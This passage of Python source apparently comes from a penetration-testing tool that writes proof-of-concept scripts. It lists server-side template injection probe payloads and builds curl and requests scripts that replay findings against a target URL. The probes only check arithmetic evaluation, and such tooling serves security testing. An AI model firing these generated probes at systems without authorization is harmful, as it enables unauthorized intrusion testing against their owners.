                ("Mako", "${{7*7}}"),
                ("ERB", "<%%= 7*7 %>"),
                ("Freemarker", "${{7*7}}"),
                ("Smarty", "{{7*7}}"),
                ("Velocity", "#set($x=7*7)$x"),
            ]

            for engine, ssti_payload in payloads:
                resp = requests.{method.lower()}(url, {"params" if method == "GET" else "data"}: {{param: ssti_payload}}, headers=headers, timeout=10)
                if "49" in resp.text:
                    print(f"[!] SSTI confirmed ({{engine}}): {{ssti_payload}} -> 49 found in response")
                    idx = resp.text.find("49")
                    context = resp.text[max(0, idx-30):idx+32]
                    print(f"    Context: ...{{context}}...")
                    break
            else:
                print("[-] No template expression evaluated - SSTI not confirmed")
        """)

        return {
            "poc_type": "ssti",
            "language": "python",
            "script": script,
            "curl_command": curl,
            "description": f"SSTI PoC for {param} parameter at {url}",
            "safety_level": "caution",
        }

    def _generate_generic_poc(self, finding: Dict[str, Any]) -> Dict[str, Any]:
        """Generate a generic replay PoC."""
        url = finding.get("url", "http://TARGET/endpoint")
        method = finding.get("method", "GET").upper()
        headers = finding.get("headers", {})
        request_body = finding.get("request") or finding.get("body") or ""

        header_flags = " ".join(f'-H "{k}: {v}"' for k, v in headers.items())
        if request_body:
            curl = f"curl -s -X {method} {header_flags} -d '{request_body}' \"{url}\"".strip()
        else:
            curl = f"curl -s -X {method} {header_flags} \"{url}\"".strip()

        script = textwrap.dedent(f"""\
            #!/usr/bin/env python3
            \"\"\"PoC: {finding.get('title', 'Security Finding')}\"\"\"
            import requests

            url = "{url}"
            method = "{method}"
            headers = {json.dumps(headers)}
            body = '''{request_body}'''

            resp = requests.request(method, url, headers=headers, data=body if body else None, timeout=10)
            print(f"Status: {{resp.status_code}}")
            print(f"Length: {{len(resp.text)}}")
            print(f"Response: {{resp.text[:500]}}")
        """)

        return {
            "poc_type": "generic",
            "language": "python",
            "script": script,
            "curl_command": curl,
            "description": f"Generic replay PoC for {finding.get('title', 'finding')} at {url}",
            "safety_level": "safe",
        }
